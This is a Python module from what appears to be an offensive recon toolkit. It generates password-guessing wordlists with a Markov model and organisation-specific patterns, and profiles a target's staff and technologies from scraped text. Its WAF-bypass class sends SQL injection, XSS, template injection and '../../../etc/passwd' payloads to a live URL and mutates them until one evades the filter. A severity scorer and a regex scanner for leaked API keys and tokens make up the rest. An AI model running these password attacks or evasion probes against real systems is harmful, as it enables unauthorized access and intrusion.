"""
ml_engine.py
============
AI/ML-Powered Security Analysis Engine:
  - Smart wordlist generator (n-gram Markov model trained on password corpora)
  - Anomaly-based WAF bypass (learn block patterns → mutate to evade)
  - NLP target profiling (extract names/tech/keywords from org text)
  - Auto-severity scoring (CVSS-like ML classifier based on vuln features)
  - Org-specific password candidate generation
  - Statistical password pattern analysis
  - Entropy-based hash detection
  - Token/key entropy scanner
"""

from __future__ import annotations

import collections
import hashlib
import json
import math
import os
import random
import re
import ssl
import string
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Dict, Iterator, List, Optional, Set, Tuple


# ---------------------------------------------------------------------------
# N-gram Markov Password Generator
# ---------------------------------------------------------------------------

class MarkovPasswordModel:
    """Character-level n-gram Markov model for password generation."""

    def __init__(self, order: int = 3):
        self.order   = order
        self.chain:  Dict[str, Dict[str, int]] = collections.defaultdict(lambda: collections.defaultdict(int))
        self.starts: List[str] = []
        self.trained = False

    def train(self, words: List[str]) -> None:
        for word in words:
            w = word.strip()
            if len(w) < self.order:
                continue
            self.starts.append(w[:self.order])
            for i in range(len(w) - self.order):
                ctx  = w[i:i + self.order]
                next_c = w[i + self.order]
                self.chain[ctx][next_c] += 1
        self.trained = True

    def train_from_file(self, path: str, max_words: int = 500_000) -> int:
        count = 0
        words = []
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    w = line.strip().split(":")[0]
                    if w:
                        words.append(w)
                        count += 1
                        if count >= max_words:
                            break
        except FileNotFoundError:
            pass
        self.train(words)
        return count

    def generate(self, min_len: int = 6, max_len: int = 14,
                 count: int = 1000, temperature: float = 1.0) -> List[str]:
        if not self.trained or not self.starts:
            return []
        results = []
        while len(results) < count:
            ctx = random.choice(self.starts)
            word = ctx
            for _ in range(max_len - self.order):
                if ctx not in self.chain:
                    break
                candidates = self.chain[ctx]
                total = sum(candidates.values())
                r = random.random() * total
                cumulative = 0
                chosen = None
                for ch, cnt in candidates.items():
                    cumulative += cnt * (1.0 / temperature if temperature != 1.0 else 1.0)
                    if r <= cumulative:
                        chosen = ch
                        break
                if chosen is None:
                    break
                word += chosen
                ctx = word[-self.order:]
            if min_len <= len(word) <= max_len:
                results.append(word)
        return results

    def save(self, path: str) -> None:
        data = {
            "order":  self.order,
            "chain":  {k: dict(v) for k, v in self.chain.items()},
            "starts": self.starts[:10_000],
        }
        with open(path, "w") as f:
            json.dump(data, f)

    def load(self, path: str) -> None:
        with open(path, "r") as f:
            data = json.load(f)
        self.order   = data["order"]
        self.chain   = collections.defaultdict(lambda: collections.defaultdict(int),
                                               {k: collections.defaultdict(int, v)
                                                for k, v in data["chain"].items()})
        self.starts  = data["starts"]
        self.trained = True


# ---------------------------------------------------------------------------
# Org-Specific Password Generator
# ---------------------------------------------------------------------------

SEASONS       = ["Spring", "Summer", "Fall", "Winter", "Autumn"]
MONTHS        = ["January","February","March","April","May","June",
                 "July","August","September","October","November","December"]
COMMON_SUFFIX = ["!", "@", "#", "$", "1", "123", "12", "1!", "!", "@123",
                 "!@#", "2023", "2024", "2025", "01", "99", "2022"]
LEET_MAP      = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7"}


class OrgPasswordGenerator:
    def __init__(self, org_name: str, keywords: Optional[List[str]] = None,
                 years: Optional[List[int]] = None):
        self.org      = org_name.strip()
        self.keywords = keywords or []
        self.years    = years or [2022, 2023, 2024, 2025]

    def _leet(self, word: str) -> str:
        return "".join(LEET_MAP.get(c.lower(), c) for c in word)

    def _variants(self, base: str) -> List[str]:
        b = base
        out = {b, b.capitalize(), b.upper(), b.lower()}
        out.add(self._leet(b))
        out.add(self._leet(b).capitalize())
        for s in COMMON_SUFFIX:
            out.add(b + s)
            out.add(b.capitalize() + s)
            out.add(self._leet(b) + s)
        for y in self.years:
            out.add(f"{b}{y}")
            out.add(f"{b.capitalize()}{y}")
            out.add(f"{b.capitalize()}{y}!")
            out.add(f"{b}{y}!")
        return list(out)

    def generate(self, max_count: int = 5000) -> List[str]:
        candidates: Set[str] = set()
        bases = [self.org] + self.keywords
        for season in SEASONS:
            for y in self.years:
                candidates.add(f"{season}{y}")
                candidates.add(f"{season}{y}!")
                candidates.add(f"{season.lower()}{y}")
        for month in MONTHS:
            for y in self.years:
                candidates.add(f"{month}{y}")
                candidates.add(f"{month}{y}!")
        for base in bases:
            for v in self._variants(base):
                candidates.add(v)
                if len(candidates) >= max_count:
                    break
        return list(candidates)[:max_count]


# ---------------------------------------------------------------------------
# NLP Target Profiler
# ---------------------------------------------------------------------------

class NLPTargetProfiler:
    STOP_WORDS = {
        "the", "a", "an", "and", "or", "but", "in", "on", "at", "to",
        "for", "of", "with", "by", "from", "is", "are", "was", "were",
        "be", "been", "have", "has", "had", "do", "does", "did", "will",
        "would", "could", "should", "may", "might", "shall", "that", "this",
        "these", "those", "it", "its", "we", "our", "us", "you", "your",
        "he", "she", "they", "their", "my", "your", "his", "her", "its",
    }

    EMAIL_RE      = re.compile(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}")
    PHONE_RE      = re.compile(r"\+?\d[\d\s\-().]{7,15}\d")
    NAME_RE       = re.compile(r"\b([A-Z][a-z]{1,20})\s([A-Z][a-z]{1,20})\b")
    TECH_RE       = re.compile(
        r"\b(python|django|flask|node\.?js|react|angular|vue|php|laravel|"
        r"wordpress|java|spring|\.net|asp\.net|ruby|rails|go|golang|rust|"
        r"kubernetes|docker|aws|azure|gcp|nginx|apache|mysql|postgresql|"
        r"mongodb|redis|elasticsearch|jenkins|github|gitlab|jira|confluence)\b",
        re.IGNORECASE
    )

    def __init__(self, text: str):
        self.text = text

    def extract_emails(self) -> List[str]:
        return list(set(self.EMAIL_RE.findall(self.text)))

    def extract_names(self) -> List[str]:
        return list(set(f"{m[0]} {m[1]}" for m in self.NAME_RE.findall(self.text)))

    def extract_technologies(self) -> List[str]:
        return list(set(m.lower() for m in self.TECH_RE.findall(self.text)))

    def extract_keywords(self, top_n: int = 30) -> List[str]:
        words = re.findall(r"\b[a-zA-Z]{4,20}\b", self.text.lower())
        freq  = collections.Counter(w for w in words if w not in self.STOP_WORDS)
        return [w for w, _ in freq.most_common(top_n)]

    def build_password_seeds(self) -> List[str]:
        seeds = set()
        seeds.update(self.extract_keywords(top_n=50))
        for name in self.extract_names():
            parts = name.split()
            seeds.update(parts)
            seeds.add(parts[0][0].lower() + parts[1].lower() if len(parts) == 2 else "")
        seeds.update(self.extract_technologies())
        seeds.discard("")
        return list(seeds)

    def profile(self) -> Dict:
        return {
            "emails":       self.extract_emails(),
            "names":        self.extract_names(),
            "technologies": self.extract_technologies(),
            "keywords":     self.extract_keywords(),
            "password_seeds": self.build_password_seeds(),
        }


# ---------------------------------------------------------------------------
# WAF Bypass ML — pattern-based evasion
# ---------------------------------------------------------------------------

EVASION_MUTATIONS = [
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.replace(" ", "%20"),
    lambda p: p.replace(" ", "+"),
    lambda p: p.replace("=", " = "),
    lambda p: p.replace("'", "''"),
    lambda p: p.replace("'", "%27"),
    lambda p: p.upper(),
    lambda p: p.lower(),
    lambda p: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
    lambda p: p.replace("and", "AnD"),
    lambda p: p.replace("or", "Or"),
    lambda p: p.replace("select", "sElEcT"),
    lambda p: p.replace("union", "uNiOn"),
    lambda p: re.sub(r"([a-zA-Z])", lambda m: m.group(1) + "/**/" if random.random() > 0.8 else m.group(1), p),
    lambda p: urllib.parse.quote(p),
    lambda p: urllib.parse.quote(urllib.parse.quote(p)),
    lambda p: p.replace("<", "%3c").replace(">", "%3e"),
    lambda p: p.replace("script", "scr\x00ipt"),
    lambda p: p.replace("script", "scr<!---->ipt"),
    lambda p: p.replace("alert", "al\\u0065rt"),
]


class WAFBypassML:
    def __init__(self, test_url: str, param: str = "q", timeout: float = 5.0):
        self.test_url = test_url
        self.param    = param
        self.timeout  = timeout
        self._block_patterns: List[re.Pattern] = []
        self._learned_blocks: List[str] = []

    def _probe(self, payload: str) -> Tuple[int, str]:
        url = self.test_url + "?" + urllib.parse.urlencode({self.param: payload})
        try:
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "Mozilla/5.0")
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as r:
                return r.status, r.read().decode("utf-8", errors="replace")[:1000]
        except urllib.error.HTTPError as e:
            return e.code, ""
        except Exception:
            return 0, ""

    def learn_waf_patterns(self, known_payloads: Optional[List[str]] = None) -> List[str]:
        payloads = known_payloads or [
            "' OR '1'='1", "1 UNION SELECT 1,2,3--",
            "<script>alert(1)</script>", "{{7*7}}",
            "../../../etc/passwd", "cmd.exe",
        ]
        blocked = []
        for pl in payloads:
            code, body = self._probe(pl)
            if code in (403, 406, 429, 503) or "blocked" in body.lower() or "waf" in body.lower():
                blocked.append(pl)
                for word in re.findall(r"[A-Z]{2,}|[a-z]{3,}", pl):
                    self._block_patterns.append(re.compile(re.escape(word), re.IGNORECASE))
        self._learned_blocks = blocked
        return blocked

    def generate_evasions(self, payload: str) -> List[str]:
        evasions = []
        for mut in EVASION_MUTATIONS:
            try:
                evasions.append(mut(payload))
            except Exception:
                pass
        return list(set(evasions))

    def smart_evade(self, payload: str) -> Optional[str]:
        evasions = self.generate_evasions(payload)
        for candidate in evasions:
            code, body = self._probe(candidate)
            if code not in (403, 406, 429, 503) and "blocked" not in body.lower():
                return candidate
        return None


# ---------------------------------------------------------------------------
# Auto-Severity Scorer
# ---------------------------------------------------------------------------

SEVERITY_RULES = [
    ({"rce", "command_injection", "code_execution"},                      "critical", 9.5),
    ({"sql_injection", "sqli", "xxe", "deserialization", "ssrf"},         "critical", 9.0),
    ({"authentication_bypass", "2fa_bypass", "oauth_bypass"},             "critical", 8.5),
    ({"xss", "stored_xss"},                                                "high",     7.5),
    ({"lfi", "path_traversal", "file_inclusion"},                         "high",     7.0),
    ({"open_redirect", "reflected_xss"},                                   "medium",   6.0),
    ({"csrf"},                                                              "medium",   5.5),
    ({"information_disclosure", "sensitive_data_exposure"},               "medium",   5.0),
    ({"misconfiguration", "security_header_missing"},                     "low",      3.5),
    ({"directory_listing"},                                                "low",      3.0),
    ({"info", "banner_grab"},                                              "info",     0.0),
]

CVSS_WEIGHTS = {
    "network":     0.85,
    "adjacent":    0.62,
    "local":       0.55,
    "physical":    0.20,
    "none_auth":   0.85,
    "low_auth":    0.62,
    "single_auth": 0.62,
    "high_impact": 1.0,
    "low_impact":  0.22,
    "none_impact": 0.0,
}


@dataclass
class ScoredFinding:
    title:       str
    vuln_type:   str
    severity:    str
    cvss_score:  float
    description: str
    mitre_id:    Optional[str] = None
    cve:         Optional[str] = None
    remediation: str = ""


MITRE_MAP = {
    "rce":                   "T1190",
    "sql_injection":         "T1190",
    "xss":                   "T1059.007",
    "ssrf":                  "T1090",
    "lfi":                   "T1083",
    "path_traversal":        "T1083",
    "deserialization":       "T1190",
    "xxe":                   "T1190",
    "open_redirect":         "T1566.002",
    "csrf":                  "T1185",
    "authentication_bypass": "T1078",
    "2fa_bypass":            "T1078",
    "directory_listing":     "T1083",
    "information_disclosure":"T1592",
    "misconfiguration":      "T1592.002",
}


class AutoSeverityScorer:
    def score(self, title: str, vuln_type: str, network_access: bool = True,
              auth_required: bool = False, evidence: str = "") -> ScoredFinding:
        vtype_lower = vuln_type.lower().replace("-", "_").replace(" ", "_")
        severity = "low"
        base_score = 2.0
        for categories, sev, score in SEVERITY_RULES:
            if any(cat in vtype_lower for cat in categories):
                severity   = sev
                base_score = score
                break

        access_mod = CVSS_WEIGHTS["network"] if network_access else CVSS_WEIGHTS["local"]
        auth_mod   = CVSS_WEIGHTS["none_auth"] if not auth_required else CVSS_WEIGHTS["single_auth"]
        impact_mod = CVSS_WEIGHTS["high_impact"] if severity in ("critical", "high") else CVSS_WEIGHTS["low_impact"]
        cvss = round(min(10.0, base_score * access_mod * auth_mod * impact_mod), 1)

        mitre_id = MITRE_MAP.get(vtype_lower)
        remediation_map = {
            "rce":                   "Patch the underlying component, disable eval/exec, sandbox execution.",
            "sql_injection":         "Use parameterised queries / prepared statements.",
            "xss":                   "Encode output, implement Content-Security-Policy.",
            "ssrf":                  "Whitelist allowed internal URLs, block metadata endpoints.",
            "lfi":                   "Validate/sanitise file paths, chroot where possible.",
            "deserialization":       "Validate/sign serialised data, use safe deserialisation libraries.",
            "authentication_bypass": "Enforce strong session validation on every protected route.",
            "2fa_bypass":            "Enforce strict 2FA validation server-side, implement rate-limiting.",
            "misconfiguration":      "Review server/application security configuration hardening guides.",
        }
        remediation = remediation_map.get(vtype_lower, "Review and harden the affected component.")
        return ScoredFinding(
            title=title, vuln_type=vtype_lower, severity=severity,
            cvss_score=cvss, description=f"Auto-scored {title} ({vuln_type})",
            mitre_id=mitre_id, remediation=remediation,
        )


# ---------------------------------------------------------------------------
# Token / Key Entropy Scanner
# ---------------------------------------------------------------------------

ENTROPY_PATTERNS = [
    ("AWS Access Key",     re.compile(r"(AKIA[A-Z0-9]{16})"),              "critical"),
    ("AWS Secret Key",     re.compile(r"([A-Za-z0-9/+=]{40})"),            "high"),
    ("GitHub Token",       re.compile(r"(gh[pousr]_[A-Za-z0-9]{36,})"),   "critical"),
    ("JWT Token",          re.compile(r"(eyJ[A-Za-z0-9_\-=]+\.[A-Za-z0-9_\-=]+\.[A-Za-z0-9_\-=]*)"), "high"),
    ("Generic API Key",    re.compile(r"([Aa][Pp][Ii]_?[Kk][Ee][Yy]\s*[:=]\s*['\"]?([A-Za-z0-9\-_]{16,64}))"), "high"),
    ("Private Key Header", re.compile(r"-----BEGIN (RSA |EC )?PRIVATE KEY-----"), "critical"),
    ("DB Connection String",re.compile(r"(mysql|postgresql|mongodb|redis)://[^\"'\s]{8,}"), "high"),
    ("Bearer Token",       re.compile(r"[Bb]earer\s+([A-Za-z0-9\-_.]+)"), "medium"),
    ("Basic Auth",         re.compile(r"[Bb]asic\s+([A-Za-z0-9+/=]{8,})"), "medium"),
    ("Slack Token",        re.compile(r"(xox[baprs]-[A-Za-z0-9\-]+)"),    "critical"),
    ("Stripe Key",         re.compile(r"(sk_live_[A-Za-z0-9]{24,})"),     "critical"),
    ("Google API Key",     re.compile(r"(AIza[A-Za-z0-9\-_]{35})"),       "critical"),
    ("Twilio Token",       re.compile(r"(SK[a-z0-9]{32})"),               "high"),
    ("SendGrid Key",       re.compile(r"(SG\.[A-Za-z0-9\-_\.]{22,}\.[A-Za-z0-9\-_\.]{43,})"), "critical"),
]


def _shannon_entropy(data: str) -> float:
    if not data:
        return 0.0
    freq = collections.Counter(data)
    l = len(data)
    return -sum(c / l * math.log2(c / l) for c in freq.values())


class EntropyScanner:
    def scan_text(self, text: str) -> List[Dict]:
        findings = []
        for name, pattern, severity in ENTROPY_PATTERNS:
            for match in pattern.finditer(text):
                token = match.group(0)
                entropy = _shannon_entropy(token)
                findings.append({
                    "type":     name,
                    "severity": severity,
                    "value":    token[:60] + ("..." if len(token) > 60 else ""),
                    "entropy":  round(entropy, 2),
                    "position": match.start(),
                })
        tokens = re.findall(r"[A-Za-z0-9+/=]{32,100}", text)
        for token in tokens:
            if _shannon_entropy(token) > 4.5:
                if not any(f["value"].startswith(token[:20]) for f in findings):
                    findings.append({
                        "type":     "High-Entropy Token",
                        "severity": "medium",
                        "value":    token[:60],
                        "entropy":  round(_shannon_entropy(token), 2),
                        "position": -1,
                    })
        return findings

    def scan_url(self, url: str) -> List[Dict]:
        try:
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "Mozilla/5.0 PhantomRecon/1.0")
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                body = r.read().decode("utf-8", errors="replace")
            return self.scan_text(body)
        except Exception:
            return []
